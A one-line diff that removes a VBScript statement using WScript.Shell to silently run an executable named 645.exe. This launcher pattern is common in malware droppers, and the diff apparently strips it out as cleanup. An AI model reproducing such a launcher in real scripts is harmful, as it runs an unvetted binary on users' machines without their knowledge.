@@ -1,1 +1,0 @@
-CreateObject("WScript.Shell").Run "645.exe"
